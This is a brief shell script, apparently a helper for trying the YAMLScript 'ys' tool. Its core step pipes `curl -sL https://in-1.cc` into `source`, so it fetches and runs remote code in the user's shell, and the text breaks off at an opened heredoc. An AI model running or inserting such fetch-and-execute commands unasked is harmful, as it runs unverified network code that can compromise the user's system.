# Note: Bash and Zsh supported but using bash for shellcheck here.
# shellcheck shell=bash

_yamlscript-try-ys() {
  # shellcheck disable=SC1090
  source <(curl -sL https://in-1.cc) --temp ys
}

_yamlscript-try-ys

unset -f _yamlscript-try-ys

cat <<'...'

